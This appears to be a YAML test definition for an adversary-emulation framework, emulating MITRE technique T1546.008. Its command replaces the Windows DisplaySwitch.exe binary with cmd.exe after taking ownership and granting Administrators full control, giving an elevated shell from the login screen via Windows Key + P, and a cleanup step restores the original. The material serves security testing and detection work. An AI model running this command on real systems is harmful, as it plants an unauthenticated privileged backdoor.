- requirements: []
  name: Soumaia ART Tests - Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
  description: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt by pressing the Windows Key + P on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique_id: T1546.008
  technique_name: 'Event Triggered Execution: Accessibility Features'
  executors:
  - cleanup:
    - copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\DisplaySwitch.exe /A & icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
  id: 5a8d84a7-a993-5921-86b0-4fdf4e4d81fb
